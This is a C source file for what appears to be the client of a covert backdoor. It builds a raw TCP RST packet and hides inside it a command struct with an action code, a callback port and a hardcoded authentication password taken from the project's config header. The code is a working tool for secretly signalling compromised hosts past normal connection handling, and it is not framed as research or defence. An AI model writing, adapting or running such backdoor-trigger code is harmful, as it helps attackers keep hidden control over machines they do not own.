#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <termios.h>
#include <errno.h>
#include <stdlib.h>


#include "../include/actions.h"
#include "../include/config.h"
#include <sys/socket.h>	
#include <netinet/in.h>	
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct tcp_options
{
  u_int8_t op0;
  u_int8_t op1;
  u_int8_t op2;
  u_int8_t op3;
  u_int8_t op4;
  u_int8_t op5;
  u_int8_t op6;
  u_int8_t op7;
};



char datagram[4096]; /* datagram buffer */

int usage(char *s) {
    printf("Usage: %s -d host -p port -l port\n", s);
    return -1;
}

unsigned long resolve(const char *host) {
    struct hostent *he;
    struct sockaddr_in si;

    he = gethostbyname(host);
    if (!he) {
        return INADDR_NONE;
    }
    memcpy((char *) &si.sin_addr, (char *) he->h_addr, sizeof(si.sin_addr));
    return si.sin_addr.s_addr;
}

int main(int argc, char **argv) {
  char *desthost;
  int opt;
  unsigned long dst_ip;
  short destport = 0;
  short srcport = 0;
  short pig_ack=0;
  struct tcphdr *tcph = (struct tcphdr *) (datagram);
  struct tcp_options *tcpopt = (struct tcp_options *) (datagram + sizeof(struct tcphdr));
  struct sockaddr_in servaddr;
  memset(datagram, 0, 4096); /* zero out the buffer */

  while ((opt = getopt(argc, argv, "s:d:p:l:") ) != EOF) {
        switch (opt) {
            case 'd':
                desthost = optarg;
                break;
            case 'p':
                destport = atoi(optarg);
                break;
            case 'l':
                srcport = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                return -1;
        }
  }

  if ( !desthost || !destport || !srcport) {
    usage(argv[0]);
    return -1;
  }
  
  dst_ip = resolve(desthost);
  if (dst_ip == INADDR_NONE) {
      perror("host");
      return -1;
  }

  int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = dst_ip;

  //inet_pton(AF_INET, dst_ip, &servaddr.sin_addr);
  int tcphdr_size = sizeof(struct tcphdr);

  tcph->source = htons(srcport); /* source port */
  tcph->dest = htons(destport); /* destination port */
  tcph->seq = htonl(31337);
  tcph->ack_seq = htonl(pig_ack);/* in first SYN packet, ACK is not present */
  tcph->doff = 7+2+1 ;
  tcph->urg = 0;
  tcph->ack = 0;
  tcph->psh = 0;
  tcph->rst = 1;
  tcph->syn = 0;
  tcph->fin = 0;
  tcph->window = htons (57344); /* FreeBSD uses this value too */
  tcph->check = 0; /* we will compute it later */
  tcph->urg_ptr = 0;
  if (tcphdr_size % 4 != 0) /* takes care of padding to 32 bits */
    tcphdr_size = ((tcphdr_size % 4) + 1) * 4;
  fprintf(stderr,"tcphdr_size %d\n",tcphdr_size);
  //tcpopt->op0=4;  // sackOK 
  //tcpopt->op1=2;  
 

      struct data cmdpkt;
      cmdpkt.port = srcport;
      cmdpkt.size = 200;
      cmdpkt.action = 3;
      memcpy(cmdpkt.pass, CLIENTAUTH, strlen(CLIENTAUTH));

  memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));

     if (sendto (s, datagram, sizeof(struct tcphdr) + 12 + sizeof(struct data) ,0, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) {
        fprintf(stderr,"Error in sendto\n");
        exit(1);
      } 
  return 0;
}
